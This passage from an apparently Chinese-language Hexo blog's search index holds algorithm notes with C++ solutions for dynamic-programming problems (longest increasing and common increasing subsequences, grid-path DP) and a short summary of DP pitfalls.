N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>g<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>a<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>n<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//此处输入的都是非负数 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;=</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>     cout<span class="token operator">&lt;&lt;</span>ans<span class="token operator">&lt;&lt;</span><span class="token string">'\n'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//g数组表示的是每个子序列的末尾的那个数(最小值),每次循环都要初始化k然后从头往后搜索g</span>     <span class="token keyword">int</span> cnt<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token keyword">while</span><span class="token punctuation">(</span>k <span class="token operator">&lt;</span> cnt<span class="token operator">&amp;&amp;</span>g<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//g数组满足严格单调递增</span>             k<span class="token operator">++</span><span class="token punctuation">;</span>        g<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">>=</span>cnt<span class="token punctuation">)</span>cnt<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>     cout<span class="token operator">&lt;&lt;</span>cnt<span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p><strong><em>注意：<br>        1.这题的代码时可以用最长上升子序列模板的优化版的<br>        2.如果题目不允许相等,那么while循环那里要加等于号</em></strong>  </p><p>最小子序列个数问题的升级版：导弹防御系统<a href="https://www.acwing.com/problem/content/189/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/189/</a><br>我不多做解释，就是加了一个dfs,要注意还原现场就好</p><h3 id="4-最长上升公共子序列"><a href="#4-最长上升公共子序列" class="headerlink" title="4.最长上升公共子序列"></a>4.最长上升公共子序列</h3><p>模板题 ：<a href="https://www.acwing.com/problem/content/274/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/274/</a><br>4.1 代码分析<br>1.dp[i][j]的含义 :第一个序列的前i项,第二个序列的前 j项,当b[j]必定被选取的时候的最长公共子序列<br>2.所以对于dp[i][j]的状态转移方程,只可能从a[i]==b[j]和a[i]!=b[j]中选<br>3.朴素版的代码就是最长公共子序列和最长上升子序列问题的直接结合<br>4.优化版中对i相同时,前j个</p><p>4.2 AC代码<br><strong><em>朴素版(最坏O^3)</em></strong></p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">3010</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//b[i]不继承,只有他一个的时候是dp值为1</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>j<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>b<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//准确的说应该是dp[i][k]其中a[i]和b[k]不相等的情况转移过来,但是因为a[i]==b[j]>b[k],所以满足条件 </span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong><em>优化版O(n^2)</em></strong></p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">3010</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//f[i][j]表示a序列长度为i且公共子序列的最后一个数字时b[j]的时候最长公共上升序列长度 </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i <span class="token operator">++</span> <span class="token punctuation">)</span> cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i <span class="token operator">++</span> <span class="token punctuation">)</span> cin <span class="token operator">>></span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i <span class="token operator">++</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//先定下a序列长度 </span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//maxv表示的是dp[i][1到j]的最大值</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j <span class="token operator">++</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//a[i]不是公共序列的最后一个数的情况 </span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> maxv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//上面maxv的含义是a[i]>b[j-1]的所有f[i][j-1]+1的最大值</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//为下一个b[j]>a[i]作准备</span>                maxv <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxv<span class="token punctuation">,</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//maxv之前已经遍历了1到j-1,a[i]与当前b[j]不匹配,所以当遇到下一个a[i]==b[j]的时候再使用maxv,而maxv在这里已经更新好了</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i <span class="token operator">++</span> <span class="token punctuation">)</span> res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> f<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> dp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> dp </tag>
            
            <tag> 最长上升子序列模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DP问题总结</title>
      <link href="/2020/08/04/dp-wen-ti-zong-jie/"/>
      <url>/2020/08/04/dp-wen-ti-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="一-DP问题常见的问法-这样问有可能是DP但不绝对"><a href="#一-DP问题常见的问法-这样问有可能是DP但不绝对" class="headerlink" title="一.DP问题常见的问法(这样问有可能是DP但不绝对)"></a>一.DP问题常见的问法(这样问有可能是DP但不绝对)</h2><p><strong><em>DP问题尤其要注意初始状态和最后状态的设定,即边界值要根据题意和数据源范围来定</em></strong></p><h3 id="1-求最大值"><a href="#1-求最大值" class="headerlink" title="1.求最大值"></a>1.求最大值</h3><p>1.1数据值存在负数时：dp值往往要先初始化成负无穷<br>1.2数据值全为非负数时：声明在全局为0即可</p><h3 id="2-求最小值"><a href="#2-求最小值" class="headerlink" title="2.求最小值"></a>2.求最小值</h3><p>2.1数据值存在负数：声明在全局为0即可<br>2.2数据值全为非负数时：dp值往往要初始化成正无穷</p><h3 id="3-求数量"><a href="#3-求数量" class="headerlink" title="3.求数量"></a>3.求数量</h3><h2 id="二-状态转移方程处常见的坑"><a href="#二-状态转移方程处常见的坑" class="headerlink" title="二.状态转移方程处常见的坑"></a>二.状态转移方程处常见的坑</h2><p>1.关于循环是正向还是逆向的问题,这一点再背包问题出会尤其明显,其总体判断依据是：<strong><em>状态转移方程中的dp量必须是之前已经更新过的正确值,或者是上一轮的值(比如01背包和完全背包),切忌用还未更新的值来转移(有时候转移方程写对但是循环顺序写错了)</em></strong></p><h2 id="三-别的方面"><a href="#三-别的方面" class="headerlink" title="三.别的方面"></a>三.别的方面</h2><p>1.动态规划问题一定要多在草稿上写一些公式,转移方程其实很简单的</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> dp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> dp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>opencv中文文档</title>
      <link href="/2020/08/04/opencv-zhong-wen-wen-dang/"/>
      <url>/2020/08/04/opencv-zhong-wen-wen-dang/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/tutorials.html" target="_blank" rel="noopener">http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/tutorials.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 人脸识别 </category>
          
          <category> opencv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 人脸识别 </tag>
            
            <tag> opencv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跑图类dp问题</title>
      <link href="/2020/08/03/pao-tu-lei-dp-wen-ti/"/>
      <url>/2020/08/03/pao-tu-lei-dp-wen-ti/</url>
      
        <content type="html"><![CDATA[<h3 id="一-跑图类dp问题的定义"><a href="#一-跑图类dp问题的定义" class="headerlink" title="一.跑图类dp问题的定义"></a>一.跑图类dp问题的定义</h3><p><strong><em>对于数字三角形模型(跑一个金字塔求最值)所演变出来的一系列跑图求最值的模型,我统称为跑图类dp问题</em></strong></p><h3 id="二-经典案例-传纸条"><a href="#二-经典案例-传纸条" class="headerlink" title="二.经典案例(传纸条)"></a>二.经典案例(传纸条)</h3><p><a href="https://www.acwing.com/activity/content/problem/content/1286/1/" target="_blank" rel="noopener">https://www.acwing.com/activity/content/problem/content/1286/1/</a></p><h4 id="1-解法分析"><a href="#1-解法分析" class="headerlink" title="1.解法分析"></a>1.解法分析</h4><p>  本题可以看作是两个人同时从起点出发(原因稍微想一下就明白了),按照闫式分析法，dp[k][i1][i2]表示的含义是走k步,两个人分别走到第i1,i2行的时候dp的最大值,那么从当前状态dp[k][i1][i2]易得：<strong><em>上一个状态的集合dp[k-1]</em></strong> 有四个元素,分别是第一个人和第二个人从向右走和向下走到(i1,k-i1),(i2,k-i2),经过排列组合2X2共有四个元素</p><h4 id="2-AC代码："><a href="#2-AC代码：" class="headerlink" title="2.AC代码："></a>2.AC代码：</h4><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//这题直接套方格取数的模板即可就最后输出的时候要注意以下,出发点和终点会重合</span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">101</span><span class="token punctuation">;</span> <span class="token keyword">int</span> dp<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> g<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">mx</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">,</span><span class="token keyword">int</span> c<span class="token punctuation">,</span><span class="token keyword">int</span> d<span class="token punctuation">)</span> <span class="token punctuation">{</span>    a<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            cin<span class="token operator">>></span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//循环这里可以直接i1和i2&lt;=n即可,但是为了效率更高,我用了min.由于合法的dp值必然是从合法的dp值转移过来,所以不必担心i1,i2超过k的问题</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;=</span>n<span class="token operator">+</span>m<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i1<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i1<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i1<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i2<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i2<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i2<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i1<span class="token operator">==</span>i2<span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token keyword">else</span><span class="token punctuation">{</span>                    dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>i1<span class="token punctuation">]</span><span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">mx</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>k<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i1<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i2<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>k<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i1<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>k<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i1<span class="token punctuation">]</span><span class="token punctuation">[</span>i2<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>k<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i1<span class="token punctuation">]</span><span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>g<span class="token punctuation">[</span>i1<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">-</span>i1<span class="token punctuation">]</span><span class="token operator">+</span>g<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">-</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//因为他们仅仅只在终点和起点会重合,且这两个点的g值为0,所以算到n+m-1步即可</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token operator">+</span>m<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h3><p>关于跑图类的模型 其实只要分析清楚定好dp数组的含义,然后找好上一个点集合的元素再列式子就能轻易解决,大部分题目较为简单,但是要注意一下是求最大值还是最小值,数据源有无负数,以及初始化位置dp值的初始化问题</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> dp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> dp </tag>
            
            <tag> 数字三角形模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同时部署在多平台</title>
      <link href="/2020/08/02/tong-shi-bu-shu-zai-duo-ping-tai/"/>
      <url>/2020/08/02/tong-shi-bu-shu-zai-duo-ping-tai/</url>
      
